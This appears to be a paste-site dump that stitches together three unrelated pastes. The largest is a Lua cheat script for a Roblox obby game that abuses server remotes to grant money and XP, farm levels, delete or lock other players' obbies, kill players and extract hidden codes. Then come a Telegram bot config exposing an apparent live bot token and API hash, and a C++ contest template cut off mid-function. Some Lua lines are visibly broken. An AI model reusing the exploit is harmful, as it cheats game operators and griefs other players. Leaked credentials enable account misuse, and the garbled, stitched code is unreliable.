        game:GetService(""ReplicatedStorage"").removeobby:InvokeServer((#game.Workspace.Terrain.Obbyplot[plrtable.plrobby].Obby:GetChildren()),plrtable.plrobby,0,0,-5,true)
        success(plr)
    end
end)
makecmd(""deleteplrobby"",""Deletes the whole obby. You need to have used selectplrobby for this."",true,false,function(plr,args)
    local plrtable = getplrtable(plr)
    if plrtable.plrobby then
        repeat
            wait(.1)
            game:GetService(""ReplicatedStorage"").removeobby:InvokeServer((#game.Workspace.Terrain.Obbyplot[plrtable.plrobby].Obby:GetChildren()),plrtable.plrobby,0,0,-5,true)
        until (#game.Workspace.Terrain.Obbyplot[plrtable.plrobby].Obby:GetChildren()) <= 0
        success(plr)
    end
end)
makecmd(""winobby"",""Win's the obby, Example: winobby Red"",false,true,function(plr,args)
    args = combineargs(args)
    local plrobby = findobj(args[1],game.Workspace.Terrain.Obbyplot)
    if plrobby then
        for i,v in pairs(plrobby:GetChildren()) do
            if v:IsA(""Model"") then
                if v.Name ~= ""looks"" and v.Name ~= ""finish_race"" then
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.money.CFrame
                    firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v.money, 0)
                elseif v.Name == ""finish_race"" then
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.finishline.CFrame
                    firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v.finishline, 0)
                end
            end
        end
        success(plr)
    end
end)
makecmd(""buildrandomobby"",""Builds a random obby, You need to have used selectplrobby for this."",true,false,function(plr,args)
    local plrtable = getplrtable(plr)
    if plrtable.plrobby then
        game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(game.ReplicatedStorage.obys:GetChildren()[math.random(1,#game.ReplicatedStorage.obys:GetChildren())].Name,plrtable.plrobby,0,0,-5,costmoney)
        success(plr)
    end
end)
makecmd(""setfinish"",""Sets the obby's Finish, You need to have used selectplrobby for this, Example: setfinish 4M_Visits"",true,true,function(plr,args)
    args = combineargs(args)
    local finish = findobj(args[1],game.ReplicatedStorage[""obby_Finish""])
    local plrtable = getplrtable(plr)
    if finish and plrtable.plrobby then
        game:GetService(""ReplicatedStorage"").Finishf:InvokeServer(plrtable.plrobby,finish.Name)
        success(plr)
    end
end)
makecmd(""setsongid"",""Sets the song id but it may be censored, You need to have used selectplrobby for this, Example: setsongid 142376088"",true,true,function(plr,args)
    args = combineargs(args)
    local plrtable = getplrtable(plr)
    if finish and plrtable.plrobby then
        game:GetService(""ReplicatedStorage"").tylergoatboyrtp:InvokeServer(plrtable.plrobby,args[1],""sound"")
        success(plr)
    end
end)
makecmd(""setplrobbyname"",""Sets the player obby's Name, You need to have used selectplrobby for this, Example: setplrobbyname TEST"",true,true,function(plr,args)
    args = combineargs(args)
    local plrtable = getplrtable(plr)
    if finish and plrtable.plrobby then
        game:GetService(""ReplicatedStorage"").tylergoatboyrtp:InvokeServer(plrtable.plrobby,args[1],""Newname"")
        success(plr)
    end
end)
makecmd(""makeobby"",""Makes a premade obby for you, You need selectplrobby for this, If you are looking for the premade obby names, do 'help premadeobbies', Example: makeobby ladder"",true,true,function(plr,args)
    args = combineargs(args)
    local plrtable = getplrtable(plr)
    local txt = args[1]:lower()
    if plrtable.plrobby then
        if txt == ""free money obby"" then
            local args
            args = {""Golden Goat Troll"",plrtable.plrobby,0,20,54.275516510009766,costmoney}
            for i=1,10 do
                game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            end
            args = {""Race checkpoint"",plrtable.plrobby,0,-179,17.275516510009766,costmoney}
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            game:GetService(""ReplicatedStorage"").Finishf:InvokeServer(plrtable.plrobby,""4M_Views"")
            game:GetService(""ReplicatedStorage"").tylergoatboyrtp:InvokeServer(plrtable.plrobbyewname"")
            game:GetService(""ReplicatedStorage"").tylergoatboyrtp:InvokeServer(plrtable.plrobby,""rainbowblocks"",""Sky"")
            game:GetService(""ReplicatedStorage"").tylergoatboyrtp:InvokeServer(plrtable.plrobby,""142376088"",""sound"")
            success(plr)
        elseif txt == ""free money obby v2"" then
            local args
            args = {""Golden Goat Troll"",plrtable.plrobby,0,1,49.275516510009766,costmoney}
            for i=1,9 do
                game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            end
            args[4] = 0
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(""Grass Checkpoint"",plrtable.plrobby,0,-8,75,costmoney)
            game:GetService(""ReplicatedStorage"").tylergoatboyrtp:InvokeServer(plrtable.plrobby,""rainbowblocks"",""Sky"")
            game:GetService(""ReplicatedStorage"").tylergoatboyrtp:InvokeServer(plrtable.plrobby,""142376088"",""sound"")
            game:GetService(""ReplicatedStorage"").Finishf:InvokeServer(plrtable.plrobby,""4M_Views"")
            success(plr)
        elseif txt == ""free money obby v2 (20 obby ver)"" or txt == ""free money obby v2 (20 obby version)"" then
            local args
            args = {""Golden Goat Troll"",plrtable.plrobby,0,1,49.275516510009766,costmoney}
            for i=1,9 do
                game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            end
            args[4] = 0
            for i=1,11 do
                game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            end
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(""Grass Checkpoint"",plrtable.plrobby,0,-8,75,costmoney)
            game:GetService(""ReplicatedStorage"").tylergoatboyrtp:InvokeServer(plrtable.plrobby,""rainbowblocks"",""Sky"")
            game:GetService(""ReplicatedStorage"").tylergoatboyrtp:InvokeServer(plrtable.plrobby,""142376088"",""sound"")
            game:GetService(""ReplicatedStorage"").Finishf:InvokeServer(plrtable.plrobby,""4M_Views"")
            success(plr)
        elseif txt == ""sus"" or txt == ""bruh"" then
            local args
            args = {""Golden Goat Troll"",plrtable.plrobby,0,0,-5,costmoney}
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            args[3] = 18.002552032470703
            args[4] = 10
            args[5] = 54.275516510009766
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            args[3] = 0
            args[4] = 2
            args[5] = 49.275516510009766
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            args[3] = 18.002552032470703
            args[4] = -2
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            args[3] = 0
            args[4] = 4
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            args[3] = 18.002552032470703
            args[4] = -16
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            args[3] = 0
            args[4] = 2
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            success(plr)
        elseif txt == ""ladder"" then
            local args = {""Race checkpoint"",plrtable.plrobby,0,0,0,costmoney}
            game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            args[1] = ""Golden Goat Troll""
            args[5] = -5
            for i=1,9 do
                game:GetService(""ReplicatedStorage"").buildobby:InvokeServer(unpack(args))
            end
            game:GetService(""ReplicatedStorage"").tylergoatboyrtp:InvokeServer(plrtable.plrobby,""rainbowblocks"",""Sky"")
            game:GetService(""ReplicatedStorage"").tylergoatboyrtp:InvokeServer(plrtable.plrobby,""142376088"",""sound"")
            success(plr)
        end
    end
end)
makecmd(""gettrails"",""Get every trail in the game, Lasts before you leave."",false,false,function(plr,args)
    for i,v in pairs(game.Players.LocalPlayer.PlayerGui.menu.Trails.Frame[""trails_frames""]:GetChildren()) do
        if v:IsA(""ImageLabel"") then 
            v.Visible = true
        end
    end
    for i,v in pairs(game.Players.LocalPlayer.PlayerGui.menu.Trails.trails:GetChildren()) do
        if v:IsA(""BoolValue"") then
            v.Value = true
        end
    end
    success(plr)
end)
makecmd(""unlockallobbies"",""Unlocks every player's obbies."",true,false,function(plr,args)
    for i,v in pairs(workspace.Terrain.Obbyplot:GetChildren()) do
        game:GetService(""ReplicatedStorage"").tylergoatboyrtp:InvokeServer(v.Name,""unlock"",""door"")
    end
    success(plr)
end)
makecmd(""lockallobbies"",""Locks every player's obbies."",true,false,function(plr,args)
    for i,v in pairs(workspace.Terrain.Obbyplot:GetChildren()) do
        game:GetService(""ReplicatedStorage"").tylergoatboyrtp:InvokeServer(v.Name,""lock"",""door"")
    end
    success(plr)
end)
makecmd(""unlockobby"",""Unlocks the player's obby, You need to have used selectplrobby for this."",true,false,function(plr,args)
    local plrtable = getplrtable(plr)
    if plrtable.plrobby then
        game:GetService(""ReplicatedStorage"").tylergoatboyrtp:InvokeServer(plrtable.plrobby,""unlock"",""door"")
        success(plr)
    end
end)
makecmd(""lockobby"",""Locks the player's obby, You need to have used selectplrobby for this."",true,false,function(plr,args)
    local plrtable = getplrtable(plr)
    if plrtable.plrobby then
        game:GetService(""ReplicatedStorage"").tylergoatboyrtp:InvokeServer(plrtable.plrobby,""lock"",""door"")
        success(plr)
    end
end)
makecmd(""listallobbystats"",""Lists all the obby's stats and puts them in a file."",false,false,function(plr,args)
    if not supportfiles then return end
    for i,v in pairs(game:GetService(""ReplicatedStorage"").obys:GetChildren()) do
        if v:IsA(""Model"") then
            add(v.Name,""buildanobbystats.lua"")
            add(""Gives: ""..tostring(v.mps.Value),""buildanobbystats.lua"")
            add(""Cost: ""..tostring(v.Price.Value),""buildanobbystats.lua"")
            add(""Size: ""..tostring(v:GetExtentsSize()),""buildanobbystats.lua"")
            add(""-----------------------------------------------------"",""buildanobbystats.lua"")
        end
    end
    success(plr)
end)
makecmd(""showobbygui"",""Shows an obby gui, Example: showobbygui Troll_Pass"",false,true,function(plr,args)
    args = combineargs(args)
    for i,v in pairs(game.Players.LocalPlayer.PlayerGui.menu.build.MAIN.Frame:GetChildren()) do
        if v.Name == args[1] then
            v.Visible = true
            for i,v in pairs(v:GetChildren()) do
                if v:IsA(""ImageLabel"") then
                    v.Visible = true
                end
            end
            success(plr)
        else
            v.Visible = false
        end
    end
end)
makecmd(""showallobbyguis"",""Shows all the obby gui's buttons"",false,false,function(plr,args)
    for i,v in pairs(game.Players.LocalPlayer.PlayerGui.menu.build.MAIN.buttons:GetChildren()) do
        if v:IsA(""ImageButton"") then
            v.Visible = true
        end
    end
    success(plr)
end)
makecmd(""listalladmins"",""Lists all the admins you whitelisted."",true,false,function(plr,args)
    local adminslist = """"
    for i,v in pairs(wl) do
        adminslist = adminslist..i.."" | ""
    end
    sayto(plr,adminslist)
end)
makecmd(""addmoney"",""Adds money to yourself, Example: addmoney 999"",false,true,function(plr,args)
    local amt = tonumber(args[1])
    if amt then
        game:GetService(""ReplicatedStorage"").EnterCode:FireServer(amt,""get trolled"",""Cash"")
    end
    success(plr)
end)
makecmd(""submoney"",""Subtracts money to yourself, Example: submoney 999"",false,true,function(plr,args)
    local amt = tonumber(args[1])
    if amt then
        game:GetService(""ReplicatedStorage"").EnterCode:FireServer(-amt,""get trolled"",""Cash"")
    end
    success(plr)
end)
makecmd(""setxp"",""Sets the xp you currently have, Example: setxp 10"",false,true,function(plr,args)
    local amt = tonumber(args[1])
    if amt then
        game:GetService(""ReplicatedStorage"").EnterCode:FireServer(amt,""get trolled"",""xp"")
    end
    success(plr)
end)
makecmd(""farmlevels"",""Farm levels, Although this can be a little bit risky"",false,false,function(plr,args)
    repeat
        task.wait()
        game:GetService(""ReplicatedStorage"").EnterCode:FireServer(999999999999999999,""get trolled"",""xp"")
        task.wait()
        game:GetService(""ReplicatedStorage"").EnterCode:FireServer(0,""get trolled"",""xp"")
        if supportgetgenv then
            farmlevels = getgenv().farmlevels
        end
    until farmlevels == false
    success(plr)
end)
makecmd(""stopfarmlevels"",""Stop farming levels"",false,false,function(plr,args)
    farmlevels = false
    if supportgetgenv then
        getgenv().farmlevels = farmlevels
    end
    success(plr)
end)
makecmd(""setprefix"",""Set the prefix of your own prefix, Example: setprefix :"",false,true,function(plr,args)
    local setprefix = combineargs(args)[1]
    prefix = setprefix
    if supportgetgenv then
        getgenv().prefix = prefix
    end
    success(plr)
end)
makecmd(""setprefix2"",""Set the prefix of the whitelisted people, Example: setprefix2 ;"",false,true,function(plr,args)
    local setprefix2 = combineargs(args)[1]
    prefix2 = setprefix2
        if supportgetgenv then
        getgenv().prefix2 = prefix2
    end
    updatewhitelistmessage()
    success(plr)
end)
makecmd(""printallplrobbynames"",""Prints all of the player obby names."",false,false,function(plr,args)
    for i,v in pairs(workspace.Terrain.Obbyplot:GetChildren()) do
        print(v.Name)
    end
    success(plr)
end)
makecmd(""printallobbynames"",""Prints all of the obby names."",false,false,function(plr,args)
    for i,v in pairs(game.ReplicatedStorage.obys:GetChildren()) do
        print(v.Name)
    end
    success(plr)
end)
makecmd(""printallfinishes"",""Prints all of the finish names."",false,false,function(plr,args)
    for i,v in pairs(game.ReplicatedStorage[""obby_Finish""]:GetChildren()) do
        print(v.Name)
    end
    success(plr)
end)
makecmd(""printallcodes"",""Prints all of the codes."",false,false,function(plr,args)
    for i,v in pairs(getconstants(getscriptclosure(game:GetService(""Players"").LocalPlayer.PlayerGui.menu.Info.Frame.Codes.Enter.LocalScript))) do
        if typeof(v) == ""string"" then
            print(i,v)
        end
    end
    warn(""codes are around 22 to 27"")
    success(plr)
end)
makecmd(""printallobbyguis"",""Prints all of the obby gui's."",false,false,function(plr,args)
    for i,v in pairs(game.Players.LocalPlayer.PlayerGui.menu.build.MAIN.Frame:GetChildren()) do
        print(v.Name)
    end
    success(plr)
end)
makecmd(""printselectedobbysize"",""Prints the selected obby size, You need to have used selectobby for this."",false,false,function(plr,args)
    local plrtable = getplrtable(plr)
    if plrtable.obby then
        print(game.ReplicatedStorage.obys[plrtable.obby]:GetExtentsSize())
    end
end)
makecmd(""copyselectedobbysize"",""Copies the selected obby size, You need to have used selectobby for this."",false,false,function(plr,args)
    local plrtable = getplrtable(plr)
    if plrtable.obby then
        setclipboard(tostring(game.ReplicatedStorage.obys[plrtable.obby]:GetExtentsSize()))
    end
end)
makecmd(""getallplrobbynames"",""Gets all of the player obby names."",true,false,function(plr,args)
    local str = """"
    for i,v in pairs(workspace.Terrain.Obbyplot:GetChildren()) do
        str = str..v.Name.."" , ""
    end
    for i,v in pairs(splittext(str)) do
        sayto(plr,v)
    end
end)
makecmd(""getallobbynames"",""Gets all of the obby names."",true,false,function(plr,args)
    local str = """"
    for i,v in pairs(game.ReplicatedStorage.obys:GetChildren()) do
        str = str..v.Name.."" , ""
    end
    for i,v in pairs(splittext(str)) do
        sayto(plr,v)
    end
end)
makecmd(""getallfinishnames"",""Gets all of the finish names."",true,false,function(plr,args)
    local str = """"
    for i,v in pairs(game.ReplicatedStorage[""obby_Finish""]:GetChildren()) do
        str = str..v.Name.."" , ""
    end
    for i,v in pairs(splittext(str)) do
        sayto(plr,v)
    end
end)
makecmd(""getallcodes"",""Gets all of the codes."",true,false,function(plr,args)
    local str = """"
    for i,v in pairs(getconstants(getscriptclosure(game:GetService(""Players"").LocalPlayer.PlayerGui.menu.Info.Frame.Codes.Enter.LocalScript))) do
        if typeof(v) == ""string"" then
            str = str..v.Name.."" , ""
        end
    end
    for i,v in pairs(splittext(str)) do
        sayto(plr,v)
    end
end)
makecmd(""getselectedobbysize"",""Gets the selected obby size, You need to have used selectobby for this."",true,false,function(plr,args)
    local plrtable = getplrtable(plr)
    if plrtable.obby then
        local size = game.ReplicatedStorage.obys[plrtable.obby]:GetExtentsSize()
        if args then
            local pos = combineargs(args)[1]:upper()
            if size[pos] then
                pos = tostring(size[pos])
                string.sub(pos,1,string.find(pos,""."")+2)
                sayto(plr,pos)
            end
        else
            size.X = pos
            string.sub(pos,1,string.find(pos,""."")+2)
            size.Y = pos
            string.sub(pos,1,string.find(pos,""."")+2)
            size.Z = pos
            string.sub(pos,1,string.find(pos,""."")+2)
            size = tostring(size)
            sayto(plr,size)
        end
    end
end)
makecmd(""help"",""Help command, Use if you are confused on a command, Example: help selectplrobby"",true,true,function(plr,args)
    local cmd = args[1]:lower()
    if cmddesc[cmd] then
        sayto(plr,cmddesc[cmd])
    end
end)
makecmd(""cmds"",""Shows all of the commands"",true,false,function(plr,args)
    local msg = """"
    for i,v in pairs(cmds) do
        if v[1] == true then
            msg = msg..i.."" | ""
        end
    end
    local splitmessages = splittext(msg)
    for i,v in pairs(splitmessages) do
        wait(.1)
        sayto(plr,v)
    end
end)
makecmd(""kill"",""Kills the player, Example: kill AreYouMental110"",true,true,function(plr,args)
    local playertokill = getplayer(args[1],plr)
    if playertokill then
        if typeof(playertokill) == ""table"" then
            for i,v in pairs(playertokill) do
                killplr(v)
            end
        else
            killplr(playertokill)
        end
        success(plr)
    end
end)
makecmd(""winpremadeobby"",""Finishes a premade obby"",false,true,function(plr,args)
    args = combineargs(args)
    if premadeobbies[args[1]:lower()] then
        local finish = premadeobbies[args[1]:lower()]
        localplr.Character.HumanoidRootPart.CFrame = finish.CFrame
        wait()
        firetouchinterest(localplr.Character.HumanoidRootPart,finish,0)
        success(plr)
    end
end)
makecmd(""printallpremadeobbies"",""Prints all of the premade obbies"",false,false,function(plr,args)
    for i,v in pairs(premadeobbies) do
        print(i)
    end
end)
makecmd(""setdeletedelay"",""Set delay before the obby deletes itself (for press2kill and press4obby)"",false,true,function(plr,args)
    local num = args[1]
    if num then
        delaybeforedelete = tonumber(num)
        success(plr)
    end
end)
makecmd(""press2kill"",""Click to kill"",false,false,function(plr,args)
    press2kill = true
    success(plr)
end)
makecmd(""stoppress2kill"",""Stop click to kill"",false,false,function(plr,args)
    press2kill = false
    success(plr)
end)
makecmd(""press4obby"",""Click for obby"",false,false,function(plr,args)
    press4obby = true
    success(plr)
end)
makecmd(""stoppress4obby"",""Stop click for obby"",false,false,function(plr,args)
    press4obby = false
    success(plr)
end)
localplrmessage = localplr.Chatted:Connect(function(message)
    local speaker = localplr.Name
    if string.sub(message,1,string.len(prefix)) == prefix then
        local cmd
        local args
        if string.find(message,"" "") then
            cmd = string.sub(message:lower(),string.len(prefix)+1,string.find(message,"" "")-1)
            local tosplit = string.sub(message,string.find(message,"" "")+1)
            args = string.split(tosplit,"" "")
        else
            cmd = string.sub(message:lower(),string.len(prefix)+1)
        end
        for i,v in pairs(cmds) do
            if i:lower() == cmd then
                if v[2] == true and args then
                    v[3](speaker,args)
                elseif v[2] == false then
                    v[3](speaker)
                end
            end
        end 
    elseif message:lower() == ""end"" then
        endfunc()
    end
end)
otherplrmessage = game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(stuff)
    local speaker = stuff.FromSpeaker
    local message = stuff.Message
    if speaker ~= localplr.Name and wl[speaker] and string.sub(message,1,string.len(prefix2)) == prefix2 then
        local cmd
        local args
        if string.find(message,"" "") then
            cmd = string.sub(message:lower(),string.len(prefix2)+1,string.find(message,"" "")-1)
            local tosplit = string.sub(message,string.find(message,"" "")+1)
            args = string.split(tosplit,"" "")
        else
            cmd = string.sub(message:lower(),string.len(prefix2)+1)
        end
        for i,v in pairs(cmds) do
            if v[1] == true and i:lower() == cmd then
                print(i)
                if v[2] == true and args then
                    v[3](speaker,args)
                elseif v[2] == false then
                    v[3](speaker)
                end
            end
        end 
    end
end)
local onplradded
endfunc = function()
    localplrmessage:Disconnect()
    otherplrmessage:Disconnect()
    inputbegan:Disconnect()
    farmlevels = false
    if supportgetgenv then
        getgenv().farmlevels = false
        getgenv().endfunc = nil
    end
    for i,v in pairs(game.Players:GetPlayers()) do
        if wl[v.Name] then
            sayto(v.Name,unwhitelistmessage)
        end
    end
    notify(""Admin ending."")
end
if supportgetgenv then
    getgenv().endfunc = endfunc
end
for i,v in pairs(cmddesc) do
    local cmd = i.."" - ""..v
    if cmds[i] and cmds[i][1] == true then
        cmd = cmd.."" (WHITELIST CAN USE)""
    end
    cmd = cmd..[[


]]
    if supportsrconsole and enablerconsole then
        rconsoleprint(cmd)
    else
        print(cmd)
    end
end
inputbegan = game:GetService(""UserInputService"").InputBegan:Connect(function(input)
    if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and (press2kill or (press4obby and localplrtable.obby)) then
        local pos = input.Position
        local ray = workspace.CurrentCamera:ViewportPointToRay(pos.X,pos.Y)
        local rayresult = workspace:Raycast(ray.Origin,ray.Direction * 5000)
        local part = rayresult.Instance
        if part then
            local char = part.Parent
            if not char:IsA(""Model"") then
                char = char.Parent
            end
            if press4obby then
                placeobbypos(rayresult.Position,localplrtable.obby)
            elseif press2kill and game.Players:GetPlayerFromCharacter(char) and game.Players:GetPlayerFromCharacter(char) ~= localplr then
                char:WaitForChild(""HumanoidRootPart"",math.huge)
                placeobbypos(char.HumanoidRootPart.Position,""chocolate20"")
            end
        end
    end
end)
function updatevalues()
    autowhitelistfriends = getgenv().autowhitelistfriends
    prefix = getgenv().prefix
    prefix2 = getgenv().prefix2
    successmessage = getgenv().successmessage
    updatewhitelistmessage()
    unwhitelistmessage = getgenv().unwhitelistmessage
    canwhitelistmessage = getgenv().canwhitelistmessage
    costmoney = getgenv().costmoney
    enablerconsole = getgenv().enablerconsole
end
function setgetgenv(txt,val)
    if supportgetgenv and getgenv()[txt] then
        getgenv()[txt] = val
        updatevalues()
    end
end
delay(5,function()
    onplradded = game.Players.PlayerAdded:Connect(function(plr)
        if localplr:IsFriendsWith(plr.UserId) and autowhitelistfriends == true and not wl[plr.Name] then
            sayto(plr.Name,autowhitelistmessage)
            wl[plr.Name] = {}
        end
    end)
    if autowhitelistfriends then
        for i,plr in pairs(game.Players:GetPlayers()) do
            if localplr:IsFriendsWith(plr.UserId) and autowhitelistfriends == true and not wl[plr.Name] then
                sayto(plr.Name,autowhitelistmessage)
                wl[plr.Name] = {}
            end
        end
    end
end)
notify(""Done Loading!"")
return setgetgenv"
1iFxKGDj,Elysia Configurations,Nicky-Lalrochhara,Python,Saturday 19th of August 2023 10:20:32 AM CDT,"from typing import List
import os.path

# This is a template configuration file for Elysia.
# You can use this file as a base for your own config file by
# copying this file to `Elysia/config.py` and filling in the values.
#


# API keys

# Bot token from Bot Father
TOKEN: str = ""220947927:AAHVhKb4ZAWiNCHYgcDlzjX3ZKJLDpdBV2g""

# Telegram API ID and API hash
# Get it from https://my.telegram.org/apps
API_ID: int = 611335
API_HASH: str = ""d524b414d21f4d37f08684c1df41ac9c""

# Tenor API key
# Get it from https://tenor.com/developer/keyregistration
# Can be empty (but the /gif command won't work without it)
TENOR_API_KEY: str = ""anything""


# Admins/sudoers settings

# Sudoers and super sudoers
SUPER_SUDOERS: List[int] = [2106498721]
SUDOERS: List[int] = [""1060318977"", ""2106498721""]

# All super sudoers should be sudoers as well
SUDOERS.extend(SUPER_SUDOERS)


# Other settings

# Database file path
DATABASE_PATH = os.path.join(""Elysia"", ""database"", ""Elysia.db"")

# Number of updates that can be processed in parallel
WORKERS = 8

# Chat used for logging
LOG_CHAT: int = -1001826367325

# Prefixes for commands
# e.g: /command and !command
PREFIXES: List[str] = [""/"", ""!""]

# List of disabled plugins
DISABLED_PLUGINS: List[str] = []"
hPvgfC0k,Untitled,Sreekar_0125,C++,Saturday 19th of August 2023 10:17:37 AM CDT,"#include <bits/stdc++.h>
using namespace std;
// #define cerr if(false)cerr
#define int long long
#define pb push_back
#define F first
#define S second
#define yes cout << ""Yes\n""
#define no cout << ""No\n""
#define yn(x) x ? yes : no
#define f(i, s, e) for (int i = s; i < e; i++)
#define traverse(i, a) for (auto i : a)
#define set_bits(x) __builtin_popcountll(x)
#define leading_zero(x) __builtin_clz(x)
#define trailing_zero(x) __builtin_ctz(x)
#define vi vector<int>
#define vb vector<bool>
#define pii pair<int, int>
#define vpi vector<pii>
#define umi unordered_map<int, int>
#define mi map<int, int>
#define si set<int>
#define sc set<char>
#define maxheap priority_queue<int>
#define minheap priority_queue<int, vector<int>, greater<int>>
#define all(x) x.begin(), x.end()
#define minele(x) *min_element(all(x))
#define maxele(x) *max_element(all(x))
#define MOD 1000000007
#define endl '\n'

#ifndef ONLINE_JUDGE
#define debug(x)            \
    cerr << (#x) << "" is ""; \
    _print(x)
#define dbg(x) \
    cerr << (#x) << "" is "" << x << endl;
#else
#define debug(x)
#define dbg(x)
#endif

const int N = 2e5;

template <typename T>
void _print(T a)
{
    cerr << a;
}
template <typename T>
void print(T a)
{
    cout << a << ' ';
}
template <typename T>
void println(T a)
{
    cout << a << endl;
}

template <typename T>
void input(vector<T> &v)
{
    f(i, 0, (int)v.size()) cin >> v[i];
}

template <typename T>
void input(T &a)
{
    cin >> a;
}

template <typename T>
void print(vector<T> &v)
{
    f(i, 0, (int)v.size()) cout << v[i] << ' ';
    cout << endl;
}

template <class T, class V>
void _print(pair<T, V> p);
template <class T>
void _print(vector<T> v);
template <class T>
void _print(set<T> v);
template <class T, class V>
void _print(map<T, V> v);
template <class T>
void _print(multiset<T> v);
template <class T, class V>
void _print(pair<T, V> p)
{
    cerr << ""{"";
    _print(p.F);
    cerr << "","";
    _print(p.S);
    cerr << ""} "";
}
template <class T>
void _print(vector<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T>
void _print(set<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T>
void _print(multiset<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T, class V>
void _print(map<T, V> v)
{
    cerr << ""[ "";
    for (auto i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T, class V>
void _print(unordered_map<T, V> v)
{
    cerr << ""[ "";
    for (auto i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}

/////////////Sieve///////////////
// vb sieve(N + 5, true);
// vi primes;
// void gensieve()
// {
//     sieve[0] = sieve[1] = false;
//     for (int i = 2; i <= sqrt(N); i++)
//     {
//         if (sieve[i])
//         {
//             for (int j = i * i; j <= N; j += i)
//                 sieve[j] = false;
//         }
//     }
//     for (int i = 2; i <= N; i++)
//     {
//         if (sieve[i])
//             primes.pb(i);
//     }
// }
////////////////////////////////

int binpow(int a, int b, int m)
{
    a %= m;
    int ans = 1;
    while (b > 0)
    {
        if (b & 1)
        {
            ans = (ans * a) % MOD;
        }
        a = (a * a) % MOD;
        b >>= 1;
    }
    return ans;
}

int modadd(int a, int b)
{
    return (a % MOD + b % MOD) % MOD;
}
int modsub(int a, int b)
{
    return ((a % MOD - b % MOD) % MOD + MOD) % MOD;
}
int modmul(int a, int b)
{
    return (a % MOD * b % MOD) % MOD;
}
int moddiv(int a, int b)
{
    return ((a % MOD) * (binpow(b, MOD - 2, MOD))) % MOD;
}

int lbnd(vi &v, int x)
{
    int n = v.size();
    int low = 0;
    int high = n - 1;
    int ans = -1;
    while (low <= high)
    {
        int mid = (low + high) >> 1;
        if (v[mid] <= x)
        {
            ans = mid;
            low = mid + 1;
        }
        else
        {
            high = mid - 1;
        }
    }
    return ans;
}

int ubnd(vi &v, int x)
{
    int n = v.size();
    int low = 0;
    int high = n - 1;
    int ans = -1;
    while (low <= high)
    {
        int mid = (low + high) >> 1;
        if (v[mid] >= x)
        {
            ans = mid;
            high = mid - 1;
        }
        else
        {
            low = mid + 1;
        }
    }
    return ans;
}

vpi moves = {{0, 1}, {1, 0}, {0, -1}, {-1, 0}};
// vi graph[N + 1];
// vb visited(N + 1, false);
// vi parent(N + 1, -1);
// vi level(N + 1, 0);

// void bfs(vi *graph, vb &visited, vi &parent, vi &level, int start)
// {
//     queue<int> q;
//     visited[start] = true;
//     q.push(start);
//     while (!q.empty())
//     {
//         int node = q.front();
//         traverse(i, graph[node])
//         {
//             if (!visited[i])
//             {
//                 if (parent[i] == -1)
//                     parent[i] = node;
//                 if (level[i] == 0)
//                     level[i] = 1 + level[node];
//                 visited[i] = true;
//                 q.push(i);
//             }
//         }
//         q.pop();
//     }
// }

// void dfs(vi *graph, vb &visited, int start)
// {
//     visited[start] = true;
//     traverse(i, graph[start])
//     {
//         if (!visited[i])
//         {
//             visited[i] = true;
//             dfs(graph, visited, i);
//         }
//     }
// }

void fast()
{
    ios_base::sync_with_stdio(false);
    cin.tie(NULL);
    cout.tie(NULL);
}

void init_code()
{
#ifndef ONLINE_JUDGE
    freopen(""input.txt"", ""r"", stdin);
    freopen(""output.txt"", ""w"", stdout);
    freopen(""error.txt"", ""w"", stderr);
#endif // ONLINE_JUDGE
}

bool isValid(int a, int b, int n)
{
    return ((a < n && a >= 0) && (b < n && b >= 0));
}

void dfs(vector<vi> &grid, vector<vb> &visited, int a, int b, int &ans)
{
    visited[a][b] = true;
    ans++;

    for (auto i : moves)
    {
        int x = a + i.F;
        int y = b + i.S;
        if (isValid(x, y, grid.size()))
            if (!visited[x][y])
            {
                dfs(grid, visited, x, y, ans);
            }
    }

    return;
}

void solve()
{
    int n, a, b;
    cin >> n >> a >> b;
    a--;
    b--;

    vector<vi> grid(n, vi(n));
    vector<vb> visited(n, vb(n, false));

    int ans = 1;

    for (auto i : moves)
    {
        int x = 0;
        if (isValid(a + i.F, b + i.S, n))
            dfs(grid, visited, a + i.F, b + i.S, x);
        dbg(x);
        ans = max(ans, x);
    }
    println(ans);
}

signed main()
{
    init_code();
    fast();
    int t = 1;
    cin >> t;
